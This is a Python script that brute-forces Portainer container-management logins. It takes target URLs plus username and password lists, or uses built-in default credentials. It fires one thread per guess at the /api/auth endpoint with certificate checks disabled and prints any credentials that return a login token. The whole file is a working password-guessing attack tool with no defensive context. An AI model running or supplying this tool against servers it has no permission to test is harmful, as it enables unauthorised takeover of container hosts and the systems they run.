import sys
import json
import urllib3
import requests
import threading
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def read_file_to_list(filename: str) -> list:
    try:
        _list: list = []
        with open(filename, 'r') as file_reader:
            for line in file_reader.readlines():
                line = line.split('\n')[0].split('\r')[0]
                _list.append(line)
            _line = list(set(_list))
            return _list
    except Exception as error:
        print("[-] Read    [%s] [error: %s]" % (filename, str(error)))
        return []


def portainer_weak_password_verify(target_url_ip: str, username: str, password: str) -> bool:
    target_url = target_url_ip + "/api/auth" if not target_url_ip.endswith("/") else target_url_ip + "api/auth"
    credentials: dict = {
        "username": username,
        "password": password
    }
    header: dict = {
        "User-Agent": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN, zh; q=0.9"
    }
    data = json.dumps(credentials)
    try:
        response: requests.Response = requests.post(url=target_url, headers=header, data=data, timeout=5, verify=False)
    except Exception as error:
        print("[-] Failed  [%s] [Connection Failed]" % str(target_url))
        return False
    code: str = str(response.status_code)
    try:
        raw_text: dict = json.loads(response.text)
    except Exception as error:
        if code == "404":
            print("[-] Error   [%s] [Response Code 404] " % target_url)
        else:
            print(response.text)
        return False

    keys: list = raw_text.keys()
    if code == "200" and "jwt" in keys:
        print("[*] Found   [%s] [Username:%s, Password:%s]" % (target_url, username, password))
        return True
    elif code == "422" or code == "403" or code == "303":
        try:
            detail = raw_text["details"]
        except Exception as error:
            print("[-] Error   [%s] [Reason: %s]" % (target_url, str(error)))
            return False
        if detail == "Unauthorized":
            print("[-] Wrong   [%s] [Username:%s, Password:%s]" % (target_url, username, password))
        elif detail == "Access denied to resource":
            print("[-] Deny    [%s] " % (target_url))
        elif detail == "Administrator initialization timeout":
            print("[-] Error   [%s] [Application Server Administrator Initialization Timeout]" % target_url)
        else:
            print(raw_text)
    else:
        print("[-] Unknown [%s] [Unknown Status Code: %s]" % (target_url, code))
    return False



class PortainerScanner:
    def __init__(self, target_ip: str, target_file=None, username_file=None, password_file=None):
        self.target_list = [target_ip] if target_ip is not None else []
        if target_file is not None:
            self.target_list.extend(read_file_to_list(target_file))
        self.size = len(self.target_list)
        self.username_list: list = read_file_to_list(username_file) if username_file is not None else ["admin", "portainer"]
        self.password_list: list = read_file_to_list(password_file) if password_file is not None else ["portainer", "12345678"]

    def scan(self):
        for target in self.target_list:
            for username in self.username_list:
                for password in self.password_list:
                    thread = threading.Thread(target=portainer_weak_password_verify, args=[target, username, password])
                    thread.start()


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("[*] Usage: Python PortainerWeakPasswordScanner.py  target|targetfile  usernamefile  passwordfile")
        exit(0)
    target_file = sys.argv[1]
    target_parameter = target_file if target_file.startswith("http") else None
    target_file = None if target_parameter is not None else target_file
    username_file = sys.argv[2]
    password_file = sys.argv[3]
    scanner = PortainerScanner(target_parameter, target_file, username_file, password_file)
    scanner.scan()
